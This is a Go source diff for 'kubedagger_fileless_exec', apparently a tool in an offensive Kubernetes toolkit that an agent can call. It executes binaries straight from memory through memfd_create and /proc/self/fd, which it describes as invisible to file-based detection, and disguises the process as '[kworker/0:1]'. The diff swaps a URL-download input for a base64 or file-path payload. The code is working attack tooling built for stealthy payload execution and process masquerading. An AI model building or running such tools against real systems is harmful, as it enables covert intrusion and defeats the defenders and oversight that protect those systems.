@@ -11,10 +11,8 @@ import (
 )
 
 type FilelessExecInput struct {
-	Binary string `json:"binary"`
-	Args   string `json:"args,omitempty"`
-	URL    string `json:"url,omitempty"`
-	Name   string `json:"name,omitempty"`
+	Payload  string `json:"payload"`
+	FakeName string `json:"fake_name,omitempty"`
 }
 
 type FilelessExecTool struct {
@@ -28,31 +26,23 @@ func NewFilelessExec(exec executor.Executor) *FilelessExecTool {
 func (t *FilelessExecTool) Name() string { return "kubedagger_fileless_exec" }
 
 func (t *FilelessExecTool) Description() string {
-	return "Execute binaries directly from memory using memfd_create without touching disk. Downloads or receives binary payload and executes via /proc/self/fd, invisible to file-based detection and leaving no filesystem artifacts."
+	return "Execute binaries directly from memory using memfd_create without touching disk. Takes an ELF file path or base64-encoded payload and executes it via /proc/self/fd, invisible to file-based detection and leaving no filesystem artifacts."
 }
 
 func (t *FilelessExecTool) InputSchema() json.RawMessage {
 	return json.RawMessage(`{
 		"type": "object",
 		"properties": {
-			"binary": {
+			"payload": {
 				"type": "string",
-				"description": "Path to binary or 'remote' if fetching from URL"
+				"description": "ELF file path or base64-encoded binary payload (required)"
 			},
-			"args": {
+			"fake_name": {
 				"type": "string",
-				"description": "Arguments to pass to the executed binary"
-			},
-			"url": {
-				"type": "string",
-				"description": "URL to fetch binary from (when binary='remote')"
-			},
-			"name": {
-				"type": "string",
-				"description": "Process name to display in /proc (camouflage)"
+				"description": "Process name to display in /proc for camouflage (default: [kworker/0:1])"
 			}
 		},
-		"required": ["binary"]
+		"required": ["payload"]
 	}`)
 }
 
@@ -62,25 +52,19 @@ func (t *FilelessExecTool) Execute(ctx context.Context, params json.RawMessage) 
 		return errorResult("invalid input: " + err.Error()), nil
 	}
 
-	if err := validateSafeString(input.Binary, "binary"); err != nil {
+	if input.Payload == "" {
+		return errorResult("payload is required"), nil
+	}
+	if err := validateSafeString(input.Payload, "payload"); err != nil {
 		return errorResult(err.Error()), nil
 	}
-	if err := validateSafeString(input.Args, "args"); err != nil {
-		return errorResult(err.Error()), nil
-	}
-	if err := validateSafeString(input.Name, "name"); err != nil {
+	if err := validateSafeString(input.FakeName, "fake_name"); err != nil {
 		return errorResult(err.Error()), nil
 	}
 
-	args := []string{"fileless-exec", "--binary", input.Binary}
-	if input.Args != "" {
-		args = append(args, "--args", input.Args)
-	}
-	if input.URL != "" {
-		args = append(args, "--url", input.URL)
-	}
-	if input.Name != "" {
-		args = append(args, "--name", input.Name)
+	args := []string{"fileless-exec", "--payload", input.Payload}
+	if input.FakeName != "" {
+		args = append(args, "--fake-name", input.FakeName)
 	}
 
 	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
